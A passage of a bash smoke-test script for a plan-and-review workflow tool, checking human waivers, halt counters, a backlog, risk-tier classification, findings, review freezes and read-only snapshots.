ok "ASK_HUMAN after REQUEST_CHANGES in APEX_ASK_HUMAN_AFTER rounds of the attempt"

# 47. The waiver: recorded only with the human's literal reply ('waive LINE') and
#     a named risk, for a SHA with REQUEST_CHANGES in this attempt; binds to SHA,
#     epoch and attempt; never skips the gate or G12; recorded as waived, never
#     approved; in provenance mode it is ledgered and lifts only REQUEST_CHANGES.
T47="$SMOKE_TMP/t47"; TW="$(cal_run "$T47" "$TWO")" || fail "init for check 47 failed"
T47S="$(st "$T47" plans/v-plan.md)"
W1="$(wcommit "$TW" w1 a.md)"; vc "$T47" review 1 "$W1" REQUEST_CHANGES >/dev/null
W2="$(wcommit "$TW" w2 a.md)"; vc "$T47" review 1 "$W2" REQUEST_CHANGES >/dev/null
expect_refusal "a waiver without the human's reply" "literal reply is required" vc "$T47" waive 1 "$W2" "" "risk"
expect_refusal "a waiver whose reply does not say 'waive 1'" "does not start with 'waive 1'" vc "$T47" waive 1 "$W2" "sure, ship it" "risk"
expect_refusal "a waiver for another line's number" "does not start with 'waive 1'" vc "$T47" waive 1 "$W2" "waive 11" "risk"
expect_refusal "a waiver without the accepted risk" "name the residual risk" vc "$T47" waive 1 "$W2" "waive 1" " "
expect_refusal "a waiver for a SHA nobody rejected" "nothing to waive" vc "$T47" waive 1 "$(git -C "$TW" rev-parse HEAD~2)" "waive 1" "risk"
vc "$T47" waive 1 "$W1" "waive 1" "old head" >/dev/null || fail "a waiver at an earlier rejected SHA was refused"
(cd "$T47" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null) || fail "gate/tier for check 47 failed"
expect_refusal "a waiver at another SHA" "requested changes" vc "$T47" complete 1 ok
vc "$T47" waive 1 "$W2" "waive 1 — accept it" "cache edge under tampering" >/dev/null || fail "a valid waiver was refused"
rm -f "$T47S/gate/last.json"
expect_refusal "a waiver that skips the green gate" "no green-gate result" vc "$T47" complete 1 ok
(cd "$T47" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1) || true
cp "$T47S/checkpoint.json" "$T47S/cp.bak"
python3 -c 'import json,sys; p=sys.argv[1]; s=json.load(open(p)); s["epoch"]=s.get("epoch",0)+1; s["tiers"]["1"]["epoch"]=s["epoch"]; json.dump(s, open(p,"w"))' "$T47S/checkpoint.json"
expect_refusal "a waiver from another epoch" "requested changes" vc "$T47" complete 1 ok
cp "$T47S/cp.bak" "$T47S/checkpoint.json"
python3 -c 'import json,sys; p=sys.argv[1]; s=json.load(open(p)); s["reviews"]["1"]["attempt"]+=1; json.dump(s, open(p,"w"))' "$T47S/checkpoint.json"
expect_refusal "a waiver from an earlier attempt" "requested changes" vc "$T47" complete 1 ok
cp "$T47S/cp.bak" "$T47S/checkpoint.json"
O47="$(vc "$T47" complete 1 ok 2>&1)" || fail "complete refused a waived head with a green gate: $O47"
has 'recorded as waived, not approved' "$O47" && python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); c=s["completes"][-1]; w=s["operator_overrides"][c["waiver"]]
assert c["review"]=="waived" and w["kind"]=="review_waiver" and w["sha"]==c["head"] and w["reply"].startswith("waive 1") and w["residual_risk"]
assert not any(x["verdict"]=="APPROVE" for x in s["reviews"]["1"]["records"])' "$T47S/checkpoint.json" || fail "the waived completion was not recorded as waived (or an APPROVE was fabricated)"
# Tier C: a waiver covers the adversarial REQUEST_CHANGES but never G12.
T47C="$SMOKE_TMP/t47c"; TW="$(cal_run "$T47C" '- [ ] **Phase 1.1** [docs][tier:c] a\n  - Acceptance: true\n')" || fail "init for check 47 (Tier C) failed"
WC="$(wcommit "$TW" c1 a.md)"; (cd "$T47C" && "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
vc "$T47C" review 1 "$WC" APPROVE >/dev/null; vc "$T47C" review 1 "$WC" REQUEST_CHANGES adv --role adversarial >/dev/null
vc "$T47C" waive 1 "$WC" "waive 1" "refutation needs a planted file" >/dev/null || fail "Tier C waiver refused"
(cd "$T47C" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null) || true
expect_refusal "a waiver that skips G12 on Tier C" "G12" vc "$T47C" complete 1 ok
vc "$T47C" approve 1 "$WC" "approve G12 1" >/dev/null
vc "$T47C" complete 1 ok >/dev/null 2>&1 || fail "a waived, G12-approved Tier C head did not complete"
# Provenance mode: ledgered as human_gate; lifts a REQUEST_CHANGES record, never an UNPARSED one.
T47P="$SMOKE_TMP/t47p"; TW="$(cal_run "$T47P" "$TWO")" || fail "init for check 47 (provenance) failed"
T47PS="$(st "$T47P" plans/v-plan.md)"; mkdir -p "$T47PS/dispatch/reviews-raw" "$SMOKE_TMP/fd47/scripts"
printf '#!/bin/sh\nexit 0\n' >"$SMOKE_TMP/fd47/scripts/route.sh"; printf '#!/bin/sh\necho "$*" >>"$(dirname "$0")/calls.log"\nexit 0\n' >"$SMOKE_TMP/fd47/scripts/ledger.sh"; chmod +x "$SMOKE_TMP/fd47/scripts/"*.sh
WP="$(wcommit "$TW" p1 a.md)"
praw() { printf '{"record_id": "rec-%s-0001", "line": 1, "head_sha": "%s", "role": "%s", "verdict": "%s", "provider": "claude-session"}' "$1" "$WP" "$2" "$3" >"$T47PS/dispatch/reviews-raw/$1.json"; }
praw rc1 reviewer REQUEST_CHANGES
(cd "$T47P" && APEX_DISPATCH_ROOT="$SMOKE_TMP/fd47" "$CP" plans/v-plan.md review 1 "$WP" REQUEST_CHANGES rv --agent-id rc1 >/dev/null) || fail "the provenance REQUEST_CHANGES record was refused"
(cd "$T47P" && APEX_DISPATCH_ROOT="$SMOKE_TMP/fd47" "$CP" plans/v-plan.md waive 1 "$WP" "waive 1" "edge needs tampering" >/dev/null) || fail "the provenance waiver was refused"
grep -q '^append human_gate .*"gate": "review-waiver".*--source cli --head '"$WP" "$SMOKE_TMP/fd47/scripts/calls.log" || fail "the waiver was not ledgered as a human_gate row"
(cd "$T47P" && APEX_GATE_TEST=true "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null) || true
praw unp reviewer UNPARSED
expect_refusal "a waiver lifting an UNPARSED record" "did not approve" indir "$T47P" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd47" "$CP" plans/v-plan.md complete 1 ok
rm -f "$T47PS/dispatch/reviews-raw/unp.json"
(cd "$T47P" && APEX_DISPATCH_ROOT="$SMOKE_TMP/fd47" "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) || fail "a waived provenance REQUEST_CHANGES still blocked complete"
ok "waiver: literal reply + named risk; bound to SHA, epoch and attempt; gate and G12 still required; recorded as waived; ledgered and REQUEST_CHANGES-only in provenance mode"

# 48. Progress-aware halts: a failure is a stall unless --progress is given AND
#     the head moved; HALT at APEX_ERROR_BUDGET stalls or APEX_ATTEMPT_CAP
#     consecutive failures, naming the counter; ESCALATE unchanged.
T48="$SMOKE_TMP/t48"; TW="$(cal_run "$T48" "$TWO")" || fail "init for check 48 failed"
for i in 1 2 3 4 5; do wcommit "$TW" "p$i" a.md >/dev/null; O48="$(vc "$T48" fail 1 "f$i" --progress "closed finding $i" 2>&1)"; done
has 'this one: progress' "$O48" && has '^ESCALATE:' "$O48" && ! has 'HALTED' "$O48" || fail "five progressing failures halted (or did not escalate): $O48"
wcommit "$TW" p6 a.md >/dev/null; O48="$(vc "$T48" fail 1 f6 --progress "closed finding 6" 2>&1)"
has 'HALTED: attempt cap reached: 6 consecutive failures (APEX_ATTEMPT_CAP=6)' "$O48" || fail "the attempt cap did not halt at 6: $O48"
vc "$T48" resume "human looked" >/dev/null
O48="$(vc "$T48" fail 1 g1 --progress "claimed" 2>&1)"; has 'this one: stall (--progress given but the head did not move' "$O48" || fail "progress without a moved head was not a stall: $O48"
vc "$T48" fail 1 g2 >/dev/null; O48="$(vc "$T48" fail 1 g3 2>&1)"
has 'HALTED: error budget exhausted: 3 stalled failures (APEX_ERROR_BUDGET=3)' "$O48" || fail "three stalls did not halt: $O48"
vc "$T48" resume "again" >/dev/null
python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); assert s["consecutive_failures"]==0 and s["consecutive_stalls"]==0' "$(st "$T48" plans/v-plan.md)/checkpoint.json" || fail "resume did not reset both counters"
expect_refusal "fail with an unknown option" "unknown fail option" vc "$T48" fail 1 x --progres y
ok "halts: stalls vs progress (claim + moved head), attempt cap, counter named; resume resets both"

# 49. Hardening backlog: add / list / done / count, one line per finding, one
#     section per plan; the brief counts open items; land.sh treats BACKLOG.md
#     exactly like the lessons ledger (exempt in the base checkout, the base's copy lands).
T49="$SMOKE_TMP/t49"; mkdir -p "$T49/.claude/apex-scope-loop"; printf '# backlog\n' >"$T49/.claude/apex-scope-loop/BACKLOG.md"
TW="$(cal_run "$T49" '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n')" || fail "init for check 49 failed"
BL="$T49/.claude/apex-scope-loop/BACKLOG.md"; BS="$EX/backlog.sh"
(cd "$T49" && "$BS" plans/v-plan.md add 1 $'cache dir edge\n## Plan: injected' --from adversarial >/dev/null && "$BS" plans/v-plan.md add 1 "second" >/dev/null) || fail "backlog add failed"
expect_refusal "a backlog item for a non-task line" "not a task" indir "$T49" "$BS" plans/v-plan.md add 2 "x"
grep -c '^## Plan: ' "$BL" | grep -qx 1 && grep -q '^- \[ \] B-001 · .* · line 1 (Phase 1.1) · from adversarial — cache dir edge ## Plan: injected$' "$BL" || fail "backlog items are not one line each in one plan section: $(cat "$BL")"
has '^BACKLOG: 2 open for this plan' "$(brief "$T49" plans/v-plan.md)" || fail "the brief did not count the open backlog items"
(cd "$T49" && "$BS" plans/v-plan.md done B-001 --now >/dev/null) || fail "backlog done failed"
expect_refusal "done for an unknown item" "is not an item" indir "$T49" "$BS" plans/v-plan.md done B-009 --now
O49="$(cd "$T49" && "$BS" plans/v-plan.md list)"; has '^BACKLOG: 1 open' "$O49" && has 'B-002' "$O49" && ! has 'B-001' "$O49" || fail "backlog list is wrong: $O49"
has 'B-001' "$(cd "$T49" && "$BS" plans/v-plan.md list --all)" || fail "backlog list --all hid a done item"
# land: the run branch also edits BACKLOG.md; the base's (dirty, uncommitted) copy is what lands.
echo "run copy" >"$TW/.claude/apex-scope-loop/BACKLOG.md"; echo doc >"$TW/n.md"; git -C "$TW" add -A; git -C "$TW" commit -qm work
(cd "$T49" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null \
  && "$CP" plans/v-plan.md review 1 "$(git -C "$TW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) || fail "the backlog land fixture could not complete"
(cd "$T49" && "$BS" plans/v-plan.md add 1 "after completion" >/dev/null)
O49="$(cd "$T49" && "$EX/land.sh" plans/v-plan.md 2>&1)" || fail "land refused with a dirty base BACKLOG.md: $O49"
git -C "$T49" show HEAD:.claude/apex-scope-loop/BACKLOG.md | grep -q 'after completion' && ! git -C "$T49" show HEAD:.claude/apex-scope-loop/BACKLOG.md | grep -q 'run copy' \
  && git -C "$T49" show HEAD:n.md >/dev/null 2>&1 || fail "land did not take the base's BACKLOG.md (or lost the run's code)"
grep -q 'BACKLOG_REL' "$EX/land.sh" && grep -q 'BACKLOG.md' "$EX/_lib.sh" "$EX/risk-tier.sh" "$EX/checkpoint.sh" || fail "BACKLOG.md is not treated like the lessons ledger everywhere"
ok "backlog: add/list/done/count, one line per item, one section per plan, counted in the brief; land takes the base's copy"

# 50. Classifier calibration: content signals are ignored in test/fixture/smoke/
#     example/docs files (named in a REASON), never in source files; their paths
#     still classify; [tier:a]/[tier:b] decide over B and content signals, never
#     over Tier C paths or [tier:c].
rtc() { # rtc TAGS FILE CONTENT [FILE CONTENT...] — risk-tier output for a fresh one-task run
  local d w; d="$(mktemp -d "$SMOKE_TMP/rtc.XXXXXX")"; w="$(cal_run "$d" "- [ ] **Phase 1.1** $1 a\n  - Acceptance: true\n")" || { echo init-failed; return 0; }
  shift; while [ $# -ge 2 ]; do mkdir -p "$w/$(dirname "$1")"; printf '%s\n' "$2" >"$w/$1"; shift 2; done
  git -C "$w" add -A; git -C "$w" commit -qm t; (cd "$d" && "$EX/risk-tier.sh" plans/v-plan.md 1 --no-record 2>&1)
}
O50="$(rtc '[docs]' tests/fixtures/pay.py 'import stripe  # amount_cents' docs/guide.md 'price: 10' scripts/smoke.sh 'echo stripe' src/x.test.ts 'charge(1)')"
has '^TIER: A' "$O50" && has 'content signals ignored in test/fixture/smoke/example/docs file: tests/fixtures/pay.py' "$O50" || fail "fixture/docs/smoke content raised the tier: $O50"
for c in 'src/pay_util.py|import stripe' 'src/attestation.py|import stripe' 'testsuite/pay.py|charge(1)'; do
  has '^TIER: C' "$(rtc '[docs]' tests/ok.py 'price' "${c%%|*}" "${c#*|}")" || fail "a content signal in ${c%%|*} was ignored"
done
has '^TIER: C' "$(rtc '[docs]' tests/auth/test_login.py 'x')" || fail "an auth path under tests/ was not Tier C"
O50="$(rtc '[docs][tier:a reason="mechanical move"]' src/x.py 'charge(1)' src/api/a.py 1 src/api/b.py 2 src/api/c.py 3 src/api/d.py 4 src/api/e.py 5 src/api/f.py 6 src/api/g.py 7)"
has '^TIER: A' "$O50" && has "overridden by the task's \[tier:a reason=\"mechanical move\"\]" "$O50" && has 'reason="mechanical move"\] decides' "$O50" || fail "[tier:a] did not decide over content and B signals (or hid them): $O50"
has '^TIER: B' "$(rtc '[docs][tier:b reason="wide but mechanical"]' notes.txt x)" || fail "[tier:b reason=...] did not set Tier B"
has '^TIER: C' "$(rtc '[docs][tier:a reason="r"]' src/auth/session.py x)" || fail "[tier:a] overrode a Tier C path signal"
has '^TIER: C' "$(rtc '[docs][tier:a reason="r"][tier:c]' notes.txt x)" || fail "[tier:a] overrode [tier:c]"
O50="$(rtc '[docs][tier:a]' src/x.py 'charge(1)')"
has '^TIER: C' "$O50" && has 'bare \[tier:a\]/\[tier:b\] tag has no effect' "$O50" || fail "a bare [tier:a] (no reason) overrode a content signal: $O50"
has '^TIER: B' "$(rtc '[docs]' a1 1 a2 2 a3 3 a4 4 a5 5 a6 6 a7 7)" || fail "breadth alone is not Tier B"
ok "classifier: fixture/docs/smoke content ignored and named, source content and exempt-dir paths still classify; [tier:a]/[tier:b] decide over B and content, never over C paths or [tier:c]"

# --- ADR-0004 addendum (downstream fork feedback): checks 51-59 ---------------
FS="$EX/findings.sh"
fx2() { local d="$1"; shift; ( cd "$d" && "$@" ); }

# 51. (A) Carried findings per task: one entry per defect (class + file:line),
#     residuals go to the backlog and never count as open, close/reopen, the
#     brief prints the file and the open count.
T51="$SMOKE_TMP/t51"; TW="$(cal_run "$T51" "$TWO")" || fail "init for check 51 failed"
F1="$(wcommit "$TW" f1 a.md)"; F2="$(wcommit "$TW" f2 a.md)"
fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity blocking --class stale-cache --at src/a.py:3 --sha "$F1" "cache not invalidated" >/dev/null || fail "findings add failed"
has 'DUPLICATE' "$(fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity blocking --class stale-cache --at src/a.py:3 --sha "$F2" "Cache  not invalidated.")" || fail "a repeated defect was not deduplicated"
O51="$(fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity non-blocking --class symlink --at src/b.py:9 --sha "$F2" "planted symlink" --from adversarial)"
has 'F-002 residual' "$O51" && has 'BACKLOG: B-001 added' "$O51" || fail "a non-blocking finding was not a residual copied to the backlog: $O51"
expect_refusal "a finding with a bad severity" "blocking or non-blocking" fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity high --class x --at a:1 --sha "$F2" "m"
expect_refusal "a finding without file:line" "--at FILE:LINE" fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity blocking --class x --sha "$F2" "m"
B51="$(brief "$T51" plans/v-plan.md)"
has "^FINDINGS: .*/findings/L1.json (1 open, 1 residual, 0 closed)" "$B51" || fail "the brief did not print the findings file and counts"
python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); x=d["items"][0]; assert len(d["items"])==2 and x["rounds"]==[sys.argv[2], sys.argv[3]]' "$(fx2 "$T51" "$FS" plans/v-plan.md path 1)" "$F1" "$F2" || fail "a defect was counted twice"
fx2 "$T51" "$FS" plans/v-plan.md close 1 F-001 --reason "test_cache added" >/dev/null
has '^FINDINGS: .*(0 open, 1 residual, 1 closed)' "$(fx2 "$T51" "$FS" plans/v-plan.md list 1 --open)" || fail "close did not close the finding"
has 'DUPLICATE.*-> open' "$(fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity blocking --class stale-cache --at src/a.py:3 --sha "$F2" "cache not invalidated")" || fail "a closed defect found again was not re-opened as the same entry"
ok "findings: one entry per defect, residuals to the backlog, close/reopen, FINDINGS in the brief"

# 52. (B) The cap counts only rounds that requested changes; Review: cap=<n>
#     overrides it; the directive is validated and what it changed is recorded;
#     Tier C keeps >= 3 lenses and the adversarial pass.
T52="$SMOKE_TMP/t52"; TW="$(cal_run "$T52" '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n  - Review: cap=1 adversarial=no\n- [ ] **Phase 1.2** [docs][tier:c] c\n  - Acceptance: true\n  - Review: lenses=correctness,security adversarial=no\n')" || fail "init for check 52 failed"
for i in 1 2 3 4; do vc "$T52" review 1 "$(wcommit "$TW" "ap$i" a.md)" APPROVE >/dev/null || fail "an approving round $i used the cap"; done
vc "$T52" review 1 "$(wcommit "$TW" rc1 a.md)" REQUEST_CHANGES >/dev/null || fail "the first blocking round was refused"
expect_refusal "a second blocking round over Review: cap=1" "REVIEW_CAP: 1 review rounds requested changes" vc "$T52" review 1 "$(wcommit "$TW" rc2 a.md)" REQUEST_CHANGES
has '^REVIEW_CAP: 1 ' "$(brief "$T52" plans/v-plan.md)" || fail "the brief did not show the directive's cap"
vc "$T52" fail 1 "cap" >/dev/null
H52="$(git -C "$TW" rev-parse HEAD)"; vc "$T52" review 1 "$H52" APPROVE >/dev/null
(cd "$T52" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
has 'Review: directive at line 1: .*"applied": \["adversarial=no", "cap=1"\]' "$(vc "$T52" complete 1 ok 2>&1)" || fail "complete did not report what the Review: directive changed"
python3 -c 'import json,sys; c=json.load(open(sys.argv[1]))["completes"][-1]; assert c["review_directive"]["applied"]==["adversarial=no","cap=1"], c' "$(st "$T52" plans/v-plan.md)/checkpoint.json" || fail "the directive's effect was not recorded in the completion"
HC="$(wcommit "$TW" c1 c.md)"; vc "$T52" review 4 "$HC" APPROVE >/dev/null
(cd "$T52" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 4 >/dev/null); vc "$T52" approve 4 "$HC" "approve G12 4" >/dev/null
expect_refusal "adversarial=no on Tier C" "adversarial review" vc "$T52" complete 4 ok
vc "$T52" review 4 "$HC" APPROVE adv --role adversarial >/dev/null
has '"ignored": \["lenses=correctness,security (Tier C keeps at least 3 distinct lenses' "$(vc "$T52" complete 4 ok 2>&1)" || fail "a Tier C directive below 3 lenses was not reported as ignored"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Review: cap=0 lenses=money,ux adversarial=maybe depth=9\n' >"$SMOKE_TMP/t52-bad.md"
O52="$(python3 "$EX/planlib.py" validate "$SMOKE_TMP/t52-bad.md" 2>&1 || true)"
for e in 'cap=0 must be 1-9' "lenses=money,ux must be" 'adversarial=maybe must be' "Review key 'depth' unknown"; do has "$e" "$O52" || fail "Review: directive validation missed: $e"; done
ok "review cap: only blocking rounds count; Review: cap/lenses/adversarial validated, applied for A/B, recorded; Tier C keeps 3+ lenses and the adversarial pass"

# 53. (C) Freeze the head during review: only the current head can be frozen;
#     review of another SHA is refused while frozen; the freeze lifts when the
#     round's verdicts are in, or on unfreeze; the brief shows it.
T53="$SMOKE_TMP/t53"; TW="$(cal_run "$T53" "$TWO")" || fail "init for check 53 failed"
Z1="$(wcommit "$TW" z1 a.md)"; Z2="$(wcommit "$TW" z2 a.md)"
expect_refusal "freezing a SHA that is not the head" "not the worktree head" vc "$T53" freeze 1 "$Z1"
vc "$T53" freeze 1 "$Z2" --reviewers 2 >/dev/null || fail "freeze of the head failed"
has "^FROZEN: $Z2 (0/2" "$(brief "$T53" plans/v-plan.md)" || fail "the brief did not show the freeze"
Z3="$(wcommit "$TW" z3 a.md)"
expect_refusal "a review of another SHA while frozen" "frozen at ${Z2:0:12}" vc "$T53" review 1 "$Z3" APPROVE
vc "$T53" review 1 "$Z2" REQUEST_CHANGES >/dev/null; has '^FREEZE: lifted' "$(vc "$T53" review 1 "$Z2" REQUEST_CHANGES r2 --role lens:money 2>&1)" || fail "the freeze did not lift when the round's verdicts were in"
vc "$T53" review 1 "$Z3" APPROVE >/dev/null || fail "a review after the freeze lifted was refused"
Z4="$(wcommit "$TW" z4 a.md)"; vc "$T53" freeze 1 "$Z4" >/dev/null; vc "$T53" unfreeze 1 >/dev/null
vc "$T53" review 1 "$(wcommit "$TW" z5 a.md)" APPROVE >/dev/null || fail "unfreeze did not lift the freeze"
grep -q 'one batch' "$PLUGIN_ROOT/commands/iterate.md" || fail "iterate.md does not say fixes land as one batch after the round"
ok "freeze: head only, other SHAs refused, lifts with the round's verdicts or unfreeze, shown in the brief"

# 54. (D) One read-only review snapshot per commit: read-tree + checkout-index
#     (export-ignore cannot drop files), setup runs once, reuse, failed setup
#     leaves nothing, pruned at complete.
T54="$SMOKE_TMP/t54"; TW="$(cal_run "$T54" "$TWO")" || fail "init for check 54 failed"
printf 'hidden.txt export-ignore\n' >"$TW/.gitattributes"; echo s >"$TW/hidden.txt"; git -C "$TW" add -A; git -C "$TW" commit -qm ei
SN="$EX/snapshot.sh"; CNT="$SMOKE_TMP/t54-setup-count"
O54="$(cd "$T54" && APEX_SNAPSHOT_SETUP="echo x >>'$CNT'; echo built >build.out" "$SN" plans/v-plan.md)" || fail "snapshot failed: $O54"
SP="$(sed -n 's/^REVIEW_SNAPSHOT: //p' <<<"$O54")"
[ -f "$SP/hidden.txt" ] && [ -f "$SP/build.out" ] && python3 -c 'import os,sys; sys.exit(any(os.stat(p).st_mode & 0o222 for p in sys.argv[1:]))' "$SP" "$SP/hidden.txt" || fail "the snapshot dropped an export-ignore file, missed the setup output, or is writable"
has 'SNAPSHOT: reused' "$(cd "$T54" && APEX_SNAPSHOT_SETUP="echo x >>'$CNT'" "$SN" plans/v-plan.md)" && [ "$(wc -l <"$CNT" | tr -d ' ')" = 1 ] || fail "the snapshot was not reused (setup ran twice)"
wcommit "$TW" more a.md >/dev/null
expect_refusal "a snapshot whose setup fails" "APEX_SNAPSHOT_SETUP failed" indir "$T54" APEX_SNAPSHOT_SETUP=false "$SN" plans/v-plan.md
[ ! -d "$(dirname "$SP")/$(git -C "$TW" rev-parse HEAD)" ] || fail "a failed setup left a snapshot behind"
(cd "$T54" && "$SN" plans/v-plan.md >/dev/null && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null \
  && "$CP" plans/v-plan.md review 1 "$(git -C "$TW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) || fail "complete failed in check 54"
[ -z "$(ls -A "$(dirname "$SP")" 2>/dev/null | grep -v '^\.tmp' || true)" ] || fail "complete did not prune the review snapshots"
ok "snapshot: read-tree + checkout-index (export-ignore kept), read-only, setup once, reused, failed setup leaves nothing, pruned at complete"

# 54b. (D) snapshot-readonly-after-move: the tree is made read-only before it is
#      renamed into <snapshots>/<sha> (macOS refuses to rename a read-only dir to
#      another parent). The snapshot lands at its sha path with its .json marker,
#      every file and directory in it is non-writable, and a second call reuses it.
T54B="$SMOKE_TMP/t54b"; TW="$(cal_run "$T54B" "$TWO")" || fail "init for check 54b failed"
echo a >"$TW/a.txt"; git -C "$TW" add -A; git -C "$TW" commit -qm a
mkdir -p "$TW/sub/deep"; echo d >"$TW/sub/deep/f.txt"; git -C "$TW" add -A; git -C "$TW" commit -qm deep
SHB="$(git -C "$TW" rev-parse HEAD)"
OB54="$(cd "$T54B" && "$SN" plans/v-plan.md)" || fail "snapshot-readonly-after-move: the snapshot failed: $OB54"
SB="$(sed -n 's/^REVIEW_SNAPSHOT: //p' <<<"$OB54")"
[ "$(basename "$SB")" = "$SHB" ] && [ -f "$SB.json" ] && [ -f "$SB/sub/deep/f.txt" ] || fail "snapshot-readonly-after-move: the snapshot is not at <snapshots>/$SHB with its .json marker: $OB54"
python3 -c 'import os,sys
bad=[]
for root,dirs,files in os.walk(sys.argv[1]):
    for n in [root]+[os.path.join(root,x) for x in dirs+files]:
        if not os.path.islink(n) and os.lstat(n).st_mode & 0o222: bad.append(n)
sys.exit(1 if bad else 0)' "$SB" || fail "snapshot-readonly-after-move: a file or directory in the snapshot is writable"
has 'SNAPSHOT: reused' "$(cd "$T54B" && "$SN" plans/v-plan.md)" || fail "snapshot-readonly-after-move: a second call did not reuse the snapshot"
# A leftover .tmp tree from a killed run (read-only subdirectory with a file) and
# its .index must be removed by prune, as check 54 runs it.
SNS54B="$(dirname "$SB")"; LEFT54B="$SNS54B/.tmp.abc123"
mkdir -p "$LEFT54B/ro" && echo x >"$LEFT54B/ro/f.txt" && echo i >"$LEFT54B.index" && chmod a-w "$LEFT54B/ro/f.txt" "$LEFT54B/ro" || fail "snapshot-readonly-after-move: could not fake a leftover temp tree"
(cd "$T54B" && "$SN" plans/v-plan.md prune >/dev/null) || fail "snapshot-readonly-after-move: prune failed"
[ ! -e "$LEFT54B" ] && [ ! -e "$LEFT54B.index" ] || fail "snapshot-readonly-after-move: prune left a read-only leftover .tmp tree or its .index behind"
ok "snapshot-readonly-after-move: snapshot lands at its sha path with its .json, every file and directory is non-writable, a second call is reused"

# 55. (E) Tier override needs its reason and records it; a reviewer raise needs a
#     reason and is recorded; size alone is Tier B (one reviewer, no G12).
T55="$SMOKE_TMP/t55"; TW="$(cal_run "$T55" '- [ ] **Phase 1.1** [docs][tier:a reason="vendored generated code"] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n')" || fail "init for check 55 failed"
wcommit "$TW" 'price = 1' util.py >/dev/null
has '^TIER: A' "$(cd "$T55" && "$EX/risk-tier.sh" plans/v-plan.md 1)" || fail "[tier:a reason=...] did not override a content signal"
python3 -c 'import json,sys; t=json.load(open(sys.argv[1]))["tiers"]["1"]; assert t["override"]=={"tier":"A","reason":"vendored generated code"}, t' "$(st "$T55" plans/v-plan.md)/checkpoint.json" || fail "the override's reason was not recorded"
expect_refusal "a raise without a reason" "needs --reason" indir "$T55" "$EX/risk-tier.sh" plans/v-plan.md 1 --raise C
has '^TIER: C' "$(cd "$T55" && "$EX/risk-tier.sh" plans/v-plan.md 1 --raise C --reason "reviewer: util.py computes prices")" || fail "--raise did not raise"
has '^TIER: C' "$(cd "$T55" && "$EX/risk-tier.sh" plans/v-plan.md 1)" && python3 -c 'import json,sys; t=json.load(open(sys.argv[1]))["tiers"]["1"]; assert t["raised"][0]["reason"].startswith("reviewer:"), t' "$(st "$T55" plans/v-plan.md)/checkpoint.json" \
  || fail "a raised tier did not stick with its reason"
T55B="$SMOKE_TMP/t55b"; TW="$(cal_run "$T55B" "$TWO")" || fail "init for check 55 (size) failed"
for i in $(seq 1 9); do seq 1 30 >"$TW/f$i.txt"; done; git -C "$TW" add -A; git -C "$TW" commit -qm big
O55="$(cd "$T55B" && "$EX/risk-tier.sh" plans/v-plan.md 1)"; has '^TIER: B' "$O55" && has 'REQUIRES: full six-lens independent review' "$O55" || fail "a large plain diff was not exactly Tier B: $O55"
(cd "$T55B" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$CP" plans/v-plan.md review 1 "$(git -C "$TW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) \
  || fail "a size-only Tier B task needed more than one reviewer or a G12"
ok "tier override: reason required and recorded; --raise needs and records a reason; size alone stays Tier B (one reviewer, no G12)"

# 56. (F) Threats: (inline and as sub-items) reach the brief; the builder
#     handback template and the working agreement ship; templates name a fallback.
T56="$SMOKE_TMP/t56"; TW="$(cal_run "$T56" '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n  - Threats: 1) stale cache; 2) crash mid-write\n    - untracked .gitignore hides siblings\n')" || fail "init for check 56 failed"
B56="$(brief "$T56" plans/v-plan.md)"
has '^THREATS: 3$' "$B56" && has '^  2\. crash mid-write$' "$B56" && has '^  3\. untracked .gitignore hides siblings$' "$B56" || fail "the Threats: list did not reach the brief: $(grep -A3 THREATS <<<"$B56")"
HB="$PLUGIN_ROOT/skills/apex-execute/resources/templates/builder-handback.md"
[ -f "$HB" ] && grep -q 'Failing-first test' "$HB" && grep -q 'Mutant' "$HB" && grep -q 'real files' "$HB" || fail "the builder handback template is missing or incomplete"
grep -q 'never obfuscate around it' "$PLUGIN_ROOT/commands/iterate.md" && grep -q 'builder-handback.md' "$PLUGIN_ROOT/commands/iterate.md" || fail "iterate.md does not hand builders the threat list, template and working agreement"
grep -q 'drop the feature' "$PLUGIN_ROOT/skills/apex-plan/resources/templates/profiles/generic/plan-template.md" || fail "the plan template does not ask hand-parsing tasks for a fallback"
ok "threats: inline and sub-item lists in the brief; builder handback template, working agreement, parser fallback"

# 57. (G) Known defect classes: lessons for the task's tags plus closed finding
